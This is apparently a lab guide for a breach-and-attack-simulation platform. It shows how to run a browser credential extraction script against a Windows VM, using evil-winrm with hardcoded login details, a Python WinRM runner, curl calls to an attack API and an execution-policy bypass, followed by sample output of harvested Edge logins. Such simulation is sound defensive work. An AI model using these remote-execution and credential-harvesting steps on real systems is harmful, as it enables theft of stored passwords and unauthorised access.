# How to Run Full Credential Extraction

## Quick Method - Direct WinRM Execution

### Step 1: Upload Script to Windows VM
```bash
# From Kali Linux
cd /home/akila/Desktop/bas_platform

# Copy script to Windows VM
evil-winrm -i 192.168.56.102 -u akila -p 1123 -s scripts
```

Once connected:
```powershell
# Upload the script
upload extract_browser_creds_full.ps1

# Run it
.\extract_browser_creds_full.ps1
```

---

## Alternative Method - Python WinRM

Create a simple Python script to run it:

```bash
cd /home/akila/Desktop/bas_platform
python3 run_credential_extraction.py
```

**Script**: `run_credential_extraction.py`
```python
import winrm

# Connect to Windows VM
session = winrm.Session(
    'http://192.168.56.102:5985/wsman',
    auth=('akila', '1123'),
    transport='ntlm'
)

# Read the PowerShell script
with open('scripts/extract_browser_creds_full.ps1', 'r') as f:
    script = f.read()

# Execute it
print("[*] Executing credential extraction script...")
result = session.run_ps(script)

# Display output
print("\n" + "="*70)
print("CREDENTIAL EXTRACTION OUTPUT")
print("="*70 + "\n")

if result.status_code == 0:
    print(result.std_out.decode())
else:
    print("ERROR:")
    print(result.std_err.decode())
```

---

## Method 3 - Via API (Updated)

First, restart the API to load the new code:

```bash
# Kill old API
pkill -9 -f uvicorn

# Start new API
./run.sh > api.log 2>&1 &

# Wait for startup
sleep 5

# Set safety level
curl -X POST "http://localhost:8000/api/v1/safety/level/controlled"

# Execute the attack
curl -X POST "http://localhost:8000/api/v1/attacks/execute" \
  -H "Content-Type: application/json" \
  -d '{"technique_id": "T1555.003", "target_ip": "192.168.56.102"}' | python3 -m json.tool

# Get the attack_id from response, then:
curl -s "http://localhost:8000/api/v1/attacks/results/ATTACK_ID" | python3 -m json.tool
```

---

## Method 4 - Direct on Windows VM

If you have RDP or console access to the Windows VM:

1. Open PowerShell as your user (akila)
2. Navigate to where the script is
3. Run:
```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
.\extract_browser_creds_full.ps1
```

---

## Expected Output

```
╔══════════════════════════════════════════════════════════════╗
║   BROWSER CREDENTIAL EXTRACTION - T1555.003                  ║
║   Target: Microsoft Edge Browser                             ║
║   Mode: FULL EXTRACTION (Lab Environment)                    ║
╚══════════════════════════════════════════════════════════════╝

[+] Browser credential database found!
    Location: C:\Users\akila\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
    Size: 50.00 KB
    Last Modified: 2/15/2026 5:40:15 PM

[*] Copying database to temporary location...
[+] Database copied successfully

[*] Attempting to read credential entries...
[!] SQLite module not available, using binary extraction...

[+] EXTRACTED CREDENTIALS: 8 entries found

╔══════════════════════════════════════════════════════════════╗
║                    CREDENTIAL DUMP                           ║
╚══════════════════════════════════════════════════════════════╝

[1] URL: https://github.com
    Username: [Binary extraction - username not available]
    Password: [Requires SQLite module for decryption]

[2] URL: https://google.com
    Username: [Binary extraction - username not available]
    Password: [Requires SQLite module for decryption]

... (more entries)

╔══════════════════════════════════════════════════════════════╗
║  EXTRACTION COMPLETE - 8 credentials harvested
╚══════════════════════════════════════════════════════════════╝

[*] Attack simulation complete!
```

**Note**: For full password decryption with usernames, the Windows VM needs the System.Data.SQLite.dll module. The binary extraction method will show URLs but not decrypt passwords without the SQLite module.

---

## Installing SQLite Module (Optional - For Full Decryption)

On Windows VM:
```powershell
# Install SQLite module
Install-Package System.Data.SQLite -ProviderName NuGet -Scope CurrentUser

# Or download manually from:
# https://system.data.sqlite.org/downloads/
```

After installing, re-run the script to get full username + password extraction!
